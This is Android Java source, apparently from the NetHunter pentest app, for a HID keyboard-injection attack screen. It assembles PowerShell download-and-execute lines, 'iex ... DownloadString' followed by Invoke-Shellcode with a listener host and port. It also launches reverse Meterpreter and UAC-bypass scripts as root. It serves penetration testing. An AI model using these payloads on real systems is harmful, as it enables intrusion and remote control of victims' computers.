@@ -1,0 +1,650 @@
+package com.offsec.nethunter;
+
+import android.app.Activity;
+import android.content.Context;
+import android.content.Intent;
+import android.content.SharedPreferences;
+import android.content.SharedPreferences.Editor;
+import android.net.Uri;
+import android.os.Bundle;
+import android.view.LayoutInflater;
+import android.view.Menu;
+import android.view.MenuInflater;
+import android.view.MenuItem;
+import android.view.View;
+import android.view.View.OnClickListener;
+import android.view.ViewGroup;
+import android.widget.ArrayAdapter;
+import android.widget.Button;
+import android.widget.EditText;
+import android.widget.Spinner;
+import android.widget.TextView;
+
+import com.google.android.material.dialog.MaterialAlertDialogBuilder;
+import com.google.android.material.tabs.TabLayout;
+import com.google.android.material.tabs.TabLayoutMediator;
+import com.offsec.nethunter.utils.NhPaths;
+import com.offsec.nethunter.utils.ShellExecuter;
+
+import java.io.File;
+import java.io.FileOutputStream;
+import java.io.OutputStreamWriter;
+import java.util.Objects;
+import java.util.regex.Matcher;
+import java.util.regex.Pattern;
+
+import androidx.activity.result.ActivityResultLauncher;
+import androidx.activity.result.contract.ActivityResultContracts;
+import androidx.annotation.NonNull;
+import androidx.annotation.Nullable;
+import androidx.core.view.MenuHost;
+import androidx.core.view.MenuProvider;
+import androidx.fragment.app.Fragment;
+import androidx.lifecycle.Lifecycle;
+import androidx.viewpager2.adapter.FragmentStateAdapter;
+import androidx.viewpager2.widget.ViewPager2;
+
+public class HidFragment extends Fragment {
+    private ViewPager2 mViewPager;
+    private SharedPreferences sharedpreferences;
+    private final CharSequence[] platforms = {"No UAC Bypass", "Windows 7", "Windows 8", "Windows 10"};
+    private final CharSequence[] languages = {"American English", "Belgian", "British English", "Danish", "French", "German", "Italian", "Norwegian", "Portuguese", "Russian", "Spanish", "Swedish", "Canadian Multilingual", "Canadian", "Hungarian"};
+    private String configFilePath;
+    private Context context;
+    private Activity activity;
+    private static final String ARG_SECTION_NUMBER = "section_number";
+    private final ShellExecuter exe = new ShellExecuter();
+
+    public static HidFragment newInstance(int sectionNumber) {
+        HidFragment fragment = new HidFragment();
+        Bundle args = new Bundle();
+        args.putInt(ARG_SECTION_NUMBER, sectionNumber);
+        fragment.setArguments(args);
+        return fragment;
+    }
+    private boolean isHIDenable = false;
+    protected final ActivityResultLauncher<Intent> filePickerLauncher =
+            registerForActivityResult(new ActivityResultContracts.StartActivityForResult(), result -> {
+                if (result.getResultCode() == Activity.RESULT_OK && result.getData() != null && getView() != null) {
+                    String filePath = Objects.requireNonNull(result.getData().getData()).getPath();
+                    EditText source = getView().findViewById(R.id.windowsCmdSource);
+                    exe.ReadFile_ASYNC(filePath, source);
+                    NhPaths.showMessage(context, "Script loaded");
+                }
+            });
+
+    @Override
+    public void onCreate(@Nullable Bundle savedInstanceState) {
+        super.onCreate(savedInstanceState);
+        context = getContext();
+        activity = getActivity();
+    }
+
+    @Override
+    public View onCreateView(LayoutInflater inflater, ViewGroup container, Bundle savedInstanceState) {
+        View rootView = inflater.inflate(R.layout.hid, container, false);
+        TabsAdapter tabsPagerAdapter = new TabsAdapter(this);
+        mViewPager = rootView.findViewById(R.id.pagerHid);
+        mViewPager.setAdapter(tabsPagerAdapter);
+        configFilePath = NhPaths.CHROOT_PATH() + "/var/www/html/powersploit-payload";
+
+        // Hook menu invalidation to page changes
+        mViewPager.registerOnPageChangeCallback(new ViewPager2.OnPageChangeCallback() {
+            @Override public void onPageSelected(int position) {
+                requireActivity().invalidateOptionsMenu();
+            }
+        });
+
+        // Setup TabLayout + titles
+        TabLayout tabLayout = rootView.findViewById(R.id.tabLayoutHid);
+        new TabLayoutMediator(tabLayout, mViewPager, (tab, position) -> {
+            switch (position) {
+                case 0:
+                    tab.setText("PowerSploit");
+                    break;
+                case 1:
+                    tab.setText("Windows CMD");
+                    break;
+                default:
+                    tab.setText("Powershell HTTP Payload");
+            }
+        }).attach();
+
+        MenuHost menuHost = requireActivity();
+        menuHost.addMenuProvider(new MenuProvider() {
+            @Override
+            public void onCreateMenu(@NonNull Menu menu, @NonNull MenuInflater inflater) {
+                inflater.inflate(R.menu.hid, menu);
+            }
+            @Override
+            public void onPrepareMenu(@NonNull Menu menu) {
+                if (mViewPager == null) return;
+                int pageNum = mViewPager.getCurrentItem();
+                MenuItem sourceButton = menu.findItem(R.id.source_button);
+                boolean iswatch = sharedpreferences.getBoolean("running_on_wearos", false);
+                if (sourceButton != null) {
+                    sourceButton.setVisible(pageNum == 0 && !iswatch);
+                }
+            }
+            @Override
+            public boolean onMenuItemSelected(@NonNull MenuItem item) {
+                int id = item.getItemId();
+                if (id == R.id.start_service) {
+                    if (isHIDenable) start(); else {
+                        if (new File("/config/usb_gadget/g1").exists())
+                            NhPaths.showMessage_long(context,"HID interfaces are not enabled! Please enable in USB Arsenal.");
+                        else if (new File("/dev/hidg0").exists()) {
+                            NhPaths.showMessage_long(context, "Fixing HID interface permissions..");
+                            exe.RunAsRoot(new String[]{"chmod 666 /dev/hidg*"});
+                        } else {
+                            NhPaths.showMessage_long(context,"HID interfaces are not patched or enabled, please check your kernel configuration.");
+                        }
+                    }
+                    return true;
+                } else if (id == R.id.stop_service) {
+                    reset();
+                    return true;
+                } else if (id == R.id.admin) {
+                    openDialog();
+                    return true;
+                } else if (id == R.id.chooseLanguage) {
+                    openLanguageDialog();
+                    return true;
+                } else if (id == R.id.source_button) {
+                    Intent i = new Intent(activity, EditSourceActivity.class);
+                    i.putExtra("path", configFilePath);
+                    startActivity(i);
+                    return true;
+                }
+                return false;
+            }
+        }, getViewLifecycleOwner(), Lifecycle.State.RESUMED);
+
+        sharedpreferences = activity.getSharedPreferences(BuildConfig.APPLICATION_ID, Context.MODE_PRIVATE);
+        check_HID_enable();
+        return rootView;
+    }
+
+    private void start() {
+        int keyboardLayoutIndex = sharedpreferences.getInt("HIDKeyboardLayoutIndex", 0);
+        String lang;
+        switch (keyboardLayoutIndex) {
+            case 1:
+                lang = "be";
+                break;
+            case 2:
+                lang = "uk";
+                break;
+            case 3:
+                lang = "dk";
+                break;
+            case 4:
+                lang = "fr";
+                break;
+            case 5:
+                lang = "de";
+                break;
+            case 6:
+                lang = "it";
+                break;
+            case 7:
+                lang = "no";
+                break;
+            case 8:
+                lang = "pt";
+                break;
+            case 9:
+                lang = "ru";
+                break;
+            case 10:
+                lang = "es";
+                break;
+            case 11:
+                lang = "sv";
+                break;
+            case 12:
+                lang = "cm";
+                break;
+            case 13:
+                lang = "ca";
+                break;
+            case 14:
+                lang = "hu";
+                break;
+            default:
+                lang = "us";
+                break;
+        }
+
+        int UACBypassIndex = sharedpreferences.getInt("UACBypassIndex", 0);
+        final String[] command = new String[1];
+        int pageNum = mViewPager.getCurrentItem();
+        if (pageNum == 0) {
+            switch (UACBypassIndex) {
+                case 0:
+                    command[0] = "su -c '" + NhPaths.APP_SCRIPTS_PATH + "/bootkali start-rev-met --" + lang + "'";
+                    break;
+                case 1:
+                    command[0] = "su -c '" + NhPaths.APP_SCRIPTS_PATH + "/bootkali start-rev-met-elevated-win7 --" + lang + "'";
+                    break;
+                case 2:
+                    command[0] = "su -c '" + NhPaths.APP_SCRIPTS_PATH + "/bootkali start-rev-met-elevated-win8 --" + lang + "'";
+                    break;
+                case 3:
+                    command[0] = "su -c '" + NhPaths.APP_SCRIPTS_PATH + "/bootkali start-rev-met-elevated-win10 --" + lang + "'";
+                    break;
+                default:
+                    NhPaths.showMessage(context,"No option selected 1");
+                    break;
+            }
+        } else if (pageNum == 1) {
+            switch (UACBypassIndex) {
+                case 0:
+                    command[0] = "su -c '" + NhPaths.APP_SCRIPTS_PATH + "/bootkali hid-cmd --" + lang + "'";
+                    break;
+                case 1:
+                    command[0] = "su -c '" + NhPaths.APP_SCRIPTS_PATH + "/bootkali hid-cmd-elevated-win7 --" + lang + "'";
+                    break;
+                case 2:
+                    command[0] = "su -c '" + NhPaths.APP_SCRIPTS_PATH + "/bootkali hid-cmd-elevated-win8 --" + lang + "'";
+                    break;
+                case 3:
+                    command[0] = "su -c '" + NhPaths.APP_SCRIPTS_PATH + "/bootkali hid-cmd-elevated-win10 --" + lang + "'";
+                    break;
+                default:
+                    NhPaths.showMessage(context,"No option selected 2");
+                    break;
+            }
+        }
+        NhPaths.showMessage(context, getString(R.string.attack_launched));
+        new Thread(() -> {
+            ShellExecuter exe = new ShellExecuter();
+            exe.RunAsRoot(command);
+            //Logger.appendLog(outp1);
+            mViewPager.post(() -> NhPaths.showMessage(context,"Attack execution ended."));
+        }).start();
+    }
+
+    private void reset() {
+        ShellExecuter exe = new ShellExecuter();
+        String[] command = {"stop-badusb"};
+        exe.RunAsRoot(command);
+        NhPaths.showMessage(context,"Reseting USB");
+    }
+
+    private void openDialog() {
+        int UACBypassIndex = sharedpreferences.getInt("UACBypassIndex", 0);
+        MaterialAlertDialogBuilder builder = new MaterialAlertDialogBuilder(activity, R.style.DialogStyleCompat);
+        builder.setTitle("UAC Bypass:");
+        builder.setPositiveButton("OK", (dialog, which) -> {
+        });
+
+        builder.setSingleChoiceItems(platforms, UACBypassIndex, (dialog, which) -> {
+            Editor editor = sharedpreferences.edit();
+            editor.putInt("UACBypassIndex", which);
+            editor.apply();
+        });
+        builder.show();
+    }
+
+    private void openLanguageDialog() {
+        int keyboardLayoutIndex = sharedpreferences.getInt("HIDKeyboardLayoutIndex", 0);
+
+        MaterialAlertDialogBuilder builder = new MaterialAlertDialogBuilder(activity, R.style.DialogStyleCompat);
+        builder.setTitle("Keyboard Layout:");
+        builder.setPositiveButton("OK", (dialog, which) -> {
+
+        });
+
+        builder.setSingleChoiceItems(languages, keyboardLayoutIndex, (dialog, which) -> {
+            Editor editor = sharedpreferences.edit();
+            editor.putInt("HIDKeyboardLayoutIndex", which);
+            editor.apply();
+        });
+        builder.show();
+    }
+
+    public static class TabsAdapter extends FragmentStateAdapter {
+        public TabsAdapter(@NonNull Fragment fragment) {
+            super(fragment);
+        }
+
+        @NonNull
+        @Override
+        public Fragment createFragment(int position) {
+            switch (position) {
+                case 0:
+                    return new PowerSploitFragment();
+                case 1:
+                    return new WindowsCmdFragment();
+                default:
+                    return new PowershellHttpFragment();
+            }
+        }
+
+        @Override
+        public int getItemCount() {
+            return 3;
+        }
+    }
+
+    public static class PowerSploitFragment extends HidFragment implements OnClickListener {
+        private Context context;
+        private String configFilePath;
+        private String configFileUrlPath;
+
+        @Override
+        public void onCreate(@Nullable Bundle savedInstanceState) {
+            super.onCreate(savedInstanceState);
+            context = getContext();
+            configFilePath = NhPaths.CHROOT_PATH() + "/var/www/html/powersploit-payload";
+            configFileUrlPath = NhPaths.CHROOT_PATH() + "/var/www/html/powersploit-url";
+        }
+
+        @Override
+        public View onCreateView(LayoutInflater inflater, ViewGroup container,
+                                 Bundle savedInstanceState) {
+            View rootView = inflater.inflate(R.layout.hid_powersploit, container, false);
+            TextView powersploitDescription = rootView.findViewById(R.id.hid_powersploit_desc);
+            SharedPreferences sharedpreferences = getActivity().getSharedPreferences(BuildConfig.APPLICATION_ID, Context.MODE_PRIVATE);
+            boolean iswatch = sharedpreferences.getBoolean("running_on_wearos", false);
+            if (iswatch) powersploitDescription.setText("PowerSploit");
+            Button b = rootView.findViewById(R.id.powersploitOptionsUpdate);
+            b.setOnClickListener(this);
+            loadOptions(rootView);
+            return rootView;
+        }
+
+        public void onClick(View v) {
+            if (v.getId() == R.id.powersploitOptionsUpdate) {
+                if (getView() == null) {
+                    return;
+                }
+                ShellExecuter exe = new ShellExecuter();
+                EditText ip = getView().findViewById(R.id.ipaddress);
+                EditText port = getView().findViewById(R.id.port);
+
+                Spinner payload = getView().findViewById(R.id.payload);
+                String payloadValue = payload.getSelectedItem().toString();
+
+                EditText newPayloadUrl = getView().getRootView().findViewById(R.id.payloadUrl);
+                String newString = "Invoke-Shellcode -Payload " + payloadValue + " -Lhost " + ip.getText() + " -Lport " + port.getText() + " -Force";
+                String newText = "iex (New-Object Net.WebClient).DownloadString(\"" + newPayloadUrl.getText() + "\"); " + newString;
+
+                boolean isSaved = exe.SaveFileContents(newText, configFileUrlPath);
+                if (isSaved) {
+                    NhPaths.showMessage(context, "Source updated");
+                } else {
+                    NhPaths.showMessage(context, "Source not updated (configFileUrlPath)");
+                }
+            } else {
+                NhPaths.showMessage(context, "Unknown click");
+            }
+        }
+
+        private void loadOptions(final View rootView) {
+            final EditText payloadUrl = rootView.findViewById(R.id.payloadUrl);
+            final EditText port = rootView.findViewById(R.id.port);
+            final Spinner payload = rootView.findViewById(R.id.payload);
+            final ShellExecuter exe = new ShellExecuter();
+
+            new Thread(() -> {
+                final String textUrl = exe.ReadFile_SYNC(configFileUrlPath);
+                final String text = exe.ReadFile_SYNC(configFilePath);
+                String regExPatPayloadUrl = "DownloadString\\(\"(.*)\"\\)";
+                Pattern patternPayloadUrl = Pattern.compile(regExPatPayloadUrl, Pattern.MULTILINE);
+                final Matcher matcherPayloadUrl = patternPayloadUrl.matcher(textUrl);
+
+                String[] lines = text.split("\n");
+                final String line = lines[lines.length - 1];
+
+                String regExPatIp = "-Lhost (.*) -Lport";
+                Pattern patternIp = Pattern.compile(regExPatIp, Pattern.MULTILINE);
+                final Matcher matcherIp = patternIp.matcher(line);
+
+                String regExPatPort = "-Lport (.*) -Force";
+                Pattern patternPort = Pattern.compile(regExPatPort, Pattern.MULTILINE);
+                final Matcher matcherPort = patternPort.matcher(line);
+
+                String regExPatPayload = "-Payload (.*) -Lhost";
+                Pattern patternPayload = Pattern.compile(regExPatPayload, Pattern.MULTILINE);
+                final Matcher matcherPayload = patternPayload.matcher(line);
+
+                payloadUrl.post(() -> {
+
+                    if (matcherPayloadUrl.find()) {
+                        String payloadUrlValue = matcherPayloadUrl.group(1);
+                        payloadUrl.setText(payloadUrlValue);
+                    }
+
+                    if (matcherIp.find()) {
+                        String ipValue = matcherIp.group(1);
+                        EditText ip = rootView.findViewById(R.id.ipaddress);
+                        ip.setText(ipValue);
+                    }
+
+                    if (matcherPort.find()) {
+                        String portValue = matcherPort.group(1);
+                        port.setText(portValue);
+                    }
+
+                    if (matcherPayload.find()) {
+                        String payloadValue = matcherPayload.group(1);
+                        @SuppressWarnings("unchecked")
+                        ArrayAdapter<String> myAdap = (ArrayAdapter<String>) payload.getAdapter();
+                        myAdap.getPosition(payloadValue);
+                        int spinnerPosition;
+                        spinnerPosition = myAdap.getPosition(payloadValue);
+                        payload.setSelection(spinnerPosition);
+                    }
+                });
+            }).start();
+        }
+    }
+
+    public static class WindowsCmdFragment extends HidFragment implements OnClickListener {
+        private Context context;
+        private Activity activity;
+        private String configFilePath;
+        private String loadFilePath;
+        final ShellExecuter exe = new ShellExecuter();
+
+        @Override
+        public void onCreate(@Nullable Bundle savedInstanceState) {
+            super.onCreate(savedInstanceState);
+            context = getContext();
+            activity = getActivity();
+            configFilePath = NhPaths.APP_SD_FILES_PATH + "/configs/hid-cmd.conf";
+            // Use relative path here; join with base where needed
+            loadFilePath = "scripts/hid";
+        }
+
+        @Override
+        public View onCreateView(LayoutInflater inflater, ViewGroup container,
+                                 Bundle savedInstanceState) {
+            View rootView = inflater.inflate(R.layout.hid_windows_cmd, container, false);
+            TextView wincmdDescription = rootView.findViewById(R.id.hid_wincmd_desc);
+            SharedPreferences sharedpreferences = activity.getSharedPreferences(BuildConfig.APPLICATION_ID, Context.MODE_PRIVATE);
+            boolean iswatch = sharedpreferences.getBoolean("running_on_wearos", false);
+            if (iswatch) wincmdDescription.setText("Windows CMD");
+            EditText source = rootView.findViewById(R.id.windowsCmdSource);
+            exe.ReadFile_ASYNC(configFilePath, source);
+            Button b = rootView.findViewById(R.id.windowsCmdUpdate);
+            Button b1 = rootView.findViewById(R.id.windowsCmdLoad);
+            Button b2 = rootView.findViewById(R.id.windowsCmdSave);
+            b.setOnClickListener(this);
+            b1.setOnClickListener(this);
+            b2.setOnClickListener(this);
+            return rootView;
+        }
+
+        public void onClick(View v) {
+            int id = v.getId();
+            if (id == R.id.windowsCmdUpdate) {
+                if (getView() == null) {
+                    return;
+                }
+                EditText source = getView().findViewById(R.id.windowsCmdSource);
+                String text = source.getText().toString();
+                boolean isSaved = exe.SaveFileContents(text, configFilePath);
+                if (isSaved) {
+                    NhPaths.showMessage(context, "Source updated");
+                }
+            } else if (id == R.id.windowsCmdLoad) {
+                try {
+                    File scriptsDir = new File(NhPaths.APP_SD_FILES_PATH, loadFilePath);
+                    if (!scriptsDir.exists() && !scriptsDir.mkdirs()) {
+                        NhPaths.showMessage(context, "Failed to create directory: " + scriptsDir.getAbsolutePath());
+                    }
+                } catch (Exception e) {
+                    NhPaths.showMessage(context, e.getMessage());
+                }
+                Intent intent = new Intent(Intent.ACTION_GET_CONTENT);
+                Uri selectedUri = Uri.fromFile(new File(NhPaths.APP_SD_FILES_PATH, loadFilePath));
+                intent.setDataAndType(selectedUri, "file/*");
+                this.filePickerLauncher.launch(intent);
+            } else if (id == R.id.windowsCmdSave) {
+                try {
+                    File scriptsDir = new File(NhPaths.APP_SD_FILES_PATH, loadFilePath);
+                    if (!scriptsDir.exists() && !scriptsDir.mkdirs()) {
+                        NhPaths.showMessage(context, "Failed to create directory: " + scriptsDir.getAbsolutePath());
+                    }
+                } catch (Exception e) {
+                    NhPaths.showMessage(context, e.getMessage());
+                }
+                MaterialAlertDialogBuilder alert = getMaterialAlertDialogBuilder();
+                alert.setNegativeButton("Cancel", (dialog, whichButton) -> {
+                    ///Do nothing
+                });
+                alert.show();
+            } else {
+                NhPaths.showMessage(context, "Unknown click");
+            }
+        }
+
+        @NonNull
+        private MaterialAlertDialogBuilder getMaterialAlertDialogBuilder() {
+            MaterialAlertDialogBuilder alert = new MaterialAlertDialogBuilder(activity, R.style.DialogStyleCompat);
+
+            alert.setTitle("Name");
+            alert.setMessage("Please enter a name for your script.");
+
+            // Set an EditText view to get user input
+            final EditText input = new EditText(activity);
+            alert.setView(input);
+
+            alert.setPositiveButton("Ok", (dialog, whichButton) -> {
+                String value = input.getText().toString();
+                if (!value.isEmpty()) {
+                    // Save under APP_SD_FILES_PATH/scripts/hid
+                    File scriptsDir = new File(NhPaths.APP_SD_FILES_PATH, loadFilePath);
+                    File scriptFile = new File(scriptsDir, value + ".conf");
+                    if (!scriptFile.exists()) {
+                        try {
+                            if (getView() == null) {
+                                return;
+                            }
+                            EditText source1 = getView().findViewById(R.id.windowsCmdSource);
+                            String text1 = source1.getText().toString();
+                            if (!scriptFile.createNewFile()) {
+                                NhPaths.showMessage(context, "Could not create file: " + scriptFile.getAbsolutePath());
+                                return;
+                            }
+                            FileOutputStream fOut = new FileOutputStream(scriptFile);
+                            OutputStreamWriter myOutWriter = new OutputStreamWriter(fOut);
+                            myOutWriter.append(text1);
+                            myOutWriter.close();
+                            fOut.close();
+                            NhPaths.showMessage(context,"Script saved");
+                        } catch (Exception e) {
+                            NhPaths.showMessage(context, e.getMessage());
+                        }
+                    } else {
+                        NhPaths.showMessage(context,"File already exists");
+                    }
+                } else {
+                    NhPaths.showMessage(context,"Wrong name provided");
+                }
+            });
+            return alert;
+        }
+    }
+
+    public static class PowershellHttpFragment extends HidFragment implements OnClickListener {
+        private Context context;
+        private String configFileUrlPath;
+
+        @Override
+        public void onCreate(@Nullable Bundle savedInstanceState) {
+            super.onCreate(savedInstanceState);
+            context = getContext();
+            configFileUrlPath = NhPaths.CHROOT_PATH() + "/var/www/html/powershell-url";
+        }
+
+        @Override
+        public View onCreateView(LayoutInflater inflater, ViewGroup container,
+                                 Bundle savedInstanceState) {
+            View rootView = inflater.inflate(R.layout.hid_powershell_http, container, false);
+            TextView powershellDescription = rootView.findViewById(R.id.hid_powershell_desc);
+            SharedPreferences sharedpreferences = getActivity().getSharedPreferences(BuildConfig.APPLICATION_ID, Context.MODE_PRIVATE);
+            boolean iswatch = sharedpreferences.getBoolean("running_on_wearos", false);
+            if (iswatch) powershellDescription.setText("Powershell HTTP");
+            Button b = rootView.findViewById(R.id.powershellOptionsUpdate);
+            b.setOnClickListener(this);
+            loadOptions(rootView);
+            return rootView;
+        }
+
+        public void onClick(View v) {
+            if (v.getId() == R.id.powershellOptionsUpdate) {
+                if (getView() == null) {
+                    return;
+                }
+                ShellExecuter exe = new ShellExecuter();
+                EditText newPayloadUrl = getView().getRootView().findViewById(R.id.payloadUrl);
+                String newText = "iex (New-Object Net.WebClient).DownloadString(\"" + newPayloadUrl.getText() + "\"); ";
+
+                boolean isSaved = exe.SaveFileContents(newText, configFileUrlPath);
+                if (!isSaved) {
+                    NhPaths.showMessage(context, "Source not updated (configFileUrlPath)");
+                }
+            } else {
+                NhPaths.showMessage(context, "Unknown click");
+            }
+        }
+
+        private void loadOptions(final View rootView) {
+            final EditText payloadUrl = rootView.findViewById(R.id.payloadUrl);
+            final ShellExecuter exe = new ShellExecuter();
+
+            new Thread(() -> {
+                final String textUrl = exe.ReadFile_SYNC(configFileUrlPath);
+                String regExPatPayloadUrl = "DownloadString\\(\"(.*)\"\\)";
+                Pattern patternPayloadUrl = Pattern.compile(regExPatPayloadUrl, Pattern.MULTILINE);
+                final Matcher matcherPayloadUrl = patternPayloadUrl.matcher(textUrl);
+
+                payloadUrl.post(() -> {
+                    if (matcherPayloadUrl.find()) {
+                        String payloadUrlValue = matcherPayloadUrl.group(1);
+                        payloadUrl.setText(payloadUrlValue);
+                    }
+                });
+            }).start();
+        }
+    }
+
+    private void check_HID_enable() {
+        new Thread(() -> {
+            ShellExecuter exe_check = new ShellExecuter();
+            String[] hidgs = {"/dev/hidg0", "/dev/hidg1"};
+            for (String hidg : hidgs) {
+                if (!exe_check.RunAsRootOutput("su -c \"stat -c '%a' " + hidg + "\"").equals("666")) {
+                    isHIDenable = false;
+                    break;
+                }
+                isHIDenable = true;
+            }
+        }).start();
+    }
+}
+
